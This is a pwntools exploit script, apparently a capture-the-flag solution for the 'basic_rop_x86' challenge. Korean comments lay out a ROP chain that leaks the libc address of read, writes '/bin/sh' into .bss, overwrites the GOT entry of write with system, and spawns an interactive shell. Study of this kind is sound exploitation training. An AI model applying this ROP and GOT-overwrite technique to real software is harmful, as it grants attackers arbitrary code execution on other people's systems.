from pwn import *		
context.arch='i386'
context.log_level='debug'

#p=remote('host3.dreamhack.games',13693)
p = process('./basic_rop_x86')
e = ELF('./basic_rop_x86')	
libc = ELF('./libc.so.6')

# prequisite
# x86은 calling convention이 x64와 다름
# 먼저 plt 부른 후 스택에 있는 매개변수 전달(정리)

# what we need? & how to
# system 함수의 주소와 /bin/sh 문자열이 필요함
# system 함수 주소는 다른 함수의 got주소와 offset으로 찾을 수 있음
# 문제는 /bin/sh 문자열을 어떻게 얻을 것인가?
# 1. libc.so.6에 있는 것을 참조한다.   
# 2. 메모리에서 쓰기 가능한 영역을 찾아 거기에 저장한 후 돌아온다.
# 두가지 방법 존재

# [exploit plan]
# 보호기법은 partial RELRO, NX enabled 
# ROP를 이용하여 payload를 짜기
# 1. 맨 처음에는 write 함수를 이용한 read함수 주소 출력
# 2. write함수를 통한 system 주소 계산 및 read함수 got overwrite
# 3. write 함수를 통한 /bin/sh 저장
# 4. system('/bin/sh')

read_plt = e.plt['read'] # read함수 plt
read_got = e.got['read'] # read함수 got
write_plt=e.plt['write'] # write함수 plt
write_got=e.got['write']
puts_plt = e.plt['puts']# puts함수 plt
main= e.symbols['main']  # main함수 심볼
bss = e.bss()

#rop gadget => ROPgadget --binary ./basic_rop_x86 --re "명령어" 로 찾음
pop_ebp = 0x0804868b #pop ebp; ret 가젯
pop_edi_ebp = 0x0804868a # pop edi; pop ebp; ret
pop_esi_edi_ebp = 0x08048689 #pop esi; pop edi; pop ebp; ret
ret=0x080483c2 # ret gadget
binsh=0x15902b

# payload
payload=b'A'*0x48 #padding buf to ebp
payload+=p32(write_plt) 
payload+=p32(pop_esi_edi_ebp) 
payload+=p32(1) 
payload+=p32(read_got)
payload+=p32(4)

payload+=p32(read_plt)
payload+=p32(pop_esi_edi_ebp)
payload+=p32(0)
payload+=p32(bss)
payload+=p32(8)

payload+=p32(read_plt)
payload+=p32(pop_esi_edi_ebp)
payload+=p32(0)
payload+=p32(write_got)
payload+=p32(4)

payload+=p32(write_plt)
payload +=b'aaaa'
payload+=p32(bss)

p.send(payload)

p.recvuntil(b'A'*0x40)
read = u32(p.recvn(4))
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']

p.send(b'/bin/sh\x00')
p.sendline(p32(system))
p.interactive()

